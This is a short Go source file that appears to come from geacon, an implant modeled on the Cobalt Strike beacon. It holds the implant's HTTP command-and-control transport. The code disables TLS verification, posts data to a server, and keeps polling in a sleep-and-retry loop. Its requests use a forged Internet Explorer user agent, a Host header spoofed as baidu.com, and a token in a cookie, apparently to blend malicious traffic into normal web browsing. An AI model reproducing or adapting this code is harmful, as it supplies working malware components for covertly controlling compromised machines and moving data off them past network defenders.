package packet

import (
	"geacon/cmd/config"
	"net/http"
	"time"

	// "fmt"
	"github.com/imroc/req"
)

var (
	httpRequest = req.New()
)

func init() {
	httpRequest.EnableInsecureTLS(true)
}

//TODO c2profile
func HttpPost(url string, data []byte) *req.Resp {
	resp, err := httpRequest.Post(url, data)
	if err != nil {
		panic(err)
	}
	if resp.Response().StatusCode == http.StatusOK {
		return resp
	}
	return nil
}
func HttpGet(url string, cookies string) *req.Resp {

	httpHeaders := req.Header{
		"User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; BOIE9;ENUS)",
		"Accept":     "*/*",
		"Host":       "baidu.com",
		"Cookie":     "token=" + cookies,
	}

	for {

		resp, err := httpRequest.Get(url, httpHeaders)
		// fmt.Println(resp)
		// fmt.Println(err)
		if err != nil {
			time.Sleep(config.WaitTime)
			continue
			//panic(err)
		} else {
			if resp.Response().StatusCode == http.StatusOK {
				//close socket

				return resp
			}
			break
		}
	}
	return nil

}
